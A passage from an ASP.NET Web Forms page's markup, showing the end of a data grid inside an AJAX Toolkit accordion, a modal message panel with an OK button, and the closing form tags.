                                                     <PagerStyle HorizontalAlign="Left" BackColor="White" PageButtonCount="20" CssClass="Numbers"
                                                Mode="NumericPages" Font-Bold="False" Font-Italic="False" Font-Overline="False" ForeColor="Gray"
                                                Font-Strikeout="False" Font-Underline="False"></PagerStyle>
                                                </asp:DataGrid>
                                            </div>
                                        </Content>
                                    </Toolkit:AccordionPane>
                                </Panes>
                            </Toolkit:Accordion>
                        </div>
                        <div class="row formWraper" style="padding: 0px;">
                            <div class="col-sm-7">
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                            </div>
                        </div>
                    </div>
                </div>
               <asp:Panel ID="pnlMessage" runat="server" CssClass="" Width="450px" BackColor="#F4F4F4"
                    Height="260px">
                    <div class="" style="padding: 0px; border-radius: 0px; background-color: #17529B;
                        color: #FFFFFF; font-size: 14px; font-weight: normal; 
                        background-repeat: no-repeat; text-align: left; vertical-align: bottom;">
                        &nbsp;&nbsp;
                        <asp:Label ID="Label13" runat="server"
                            Font-Size="14pt" Text="Message..." ForeColor="White" />
                    </div>
                    <div style="padding: 0px; border-radius: 0px;">
                        <table style="background-position: center; width: 430px; height: 175px;">
                            <tr>
                                <td align="center" valign="middle">
                                    <asp:Label ID="lblRecHeader" runat="server" Font-Bold="False" Font-Italic="False"
                                        Font-Size="10.5pt" Font-Underline="False" ForeColor="#333333" Text="Message"
                                        Width="350px" CssClass="Labelfield2-14" />
                                </td>
                            </tr>
                        </table>
                    </div>
                    <div class="" align="center">
                        <asp:Button ID="btnAceptar" runat="server" Text="OK" Width="150px" CssClass="btn btn-primary btn-lg btn-block" />
                    </div>
                </asp:Panel>
                <Toolkit:ModalPopupExtender ID="mpeSeleccion" runat="server" BackgroundCssClass=""
                    DropShadow="True" PopupControlID="pnlMessage" TargetControlID="btnDummy2" OkControlID="btnAceptar">
                </Toolkit:ModalPopupExtender>
                <asp:Button ID="btnDummy2" runat="server" Visible="true" BackColor="Transparent"
                    BorderStyle="None" BorderWidth="0" BorderColor="Transparent" />
                <Toolkit:RoundedCornersExtender ID="RoundedCornersExtender2" runat="server" TargetControlID="pnlMessage"
                    Radius="0" Corners="All" />
            </ContentTemplate>
        </asp:UpdatePanel>
        <asp:Literal ID="litPopUp" runat="server" Visible="False"></asp:Literal>
        <input id="ConfirmDialogBoxPopUp" runat="server" name="ConfirmDialogBoxPopUp" size="1"
            style="z-index: 102; left: 783px; width: 35px; position: absolute; top: 895px;
            height: 22px" type="hidden" value="false" />
    </div>
    </form>
